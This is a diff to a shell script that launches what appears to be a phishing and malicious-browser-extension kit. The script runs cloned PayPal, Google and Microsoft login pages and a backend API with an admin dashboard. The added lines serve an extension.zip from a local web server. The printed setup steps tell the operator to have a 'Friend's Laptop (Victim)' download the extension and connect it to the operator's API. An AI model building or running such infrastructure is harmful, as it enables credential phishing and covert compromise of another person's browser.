@@ -82,18 +82,26 @@ MICROSOFT_PID=$!
 
 echo -e "${GREEN}✓ Phishing pages started (Ports: 3001-3003)${NC}"
 
+# 5. Start Extension Server (Live Updates)
+echo -e "\n${BLUE}[5/5] Starting Extension Distribution Server...${NC}"
+# Serve the current directory so extension.zip is accessible
+nohup python3 -m http.server 3004 > logs/extension_server.log 2>&1 &
+EXTENSION_PID=$!
+echo -e "${GREEN}✓ Extension server started on http://$LOCAL_IP:3004/extension.zip${NC}"
+
 # Final Summary
 echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
 echo -e "${GREEN}║              All Components Running Successfully!          ║${NC}"
 echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
 
 echo -e "\n${BLUE}Settings for your Friend's Laptop (Victim):${NC}"
-echo -e "  1. Extension API Base URL:  ${YELLOW}http://$LOCAL_IP:8000${NC}"
-echo -e "  2. Phishing Targets:       (See below)${NC}"
+echo -e "  1. Download Extension:     ${YELLOW}http://$LOCAL_IP:3004/extension.zip${NC}"
+echo -e "  2. Extension API Base URL:  ${YELLOW}http://$LOCAL_IP:8000${NC}"
+echo -e "  3. Phishing Targets:       (See below)${NC}"
 
 echo -e "\n${BLUE}URLs for your Laptop (Admin):${NC}"
 echo -e "  📊 Dashboard:               ${YELLOW}http://localhost:5173${NC}"
-echo -e "  🔧 Backend API Health:      ${YELLOW}http://localhost:8000/health${NC}"
+echo -e "  🔄 Auto-Zip Watcher:        ${YELLOW}Run ./watch_extension.sh in a new tab${NC}"
 
 echo -e "\n${BLUE}Phishing Targets:${NC}"
 echo -e "  PayPal:                    http://$LOCAL_IP:3001"
@@ -103,7 +111,7 @@ echo -e "  Microsoft:                 http://$LOCAL_IP:3003"
 # Cleanup function
 cleanup() {
     echo -e "\n\n${YELLOW}Shutting down all components...${NC}"
-    kill $BACKEND_PID $DASHBOARD_PID $PAYPAL_PID $GOOGLE_PID $MICROSOFT_PID 2>/dev/null || true
+    kill $BACKEND_PID $DASHBOARD_PID $PAYPAL_PID $GOOGLE_PID $MICROSOFT_PID $EXTENSION_PID 2>/dev/null || true
     echo -e "${GREEN}Goodbye!${NC}"
     exit 0
 }
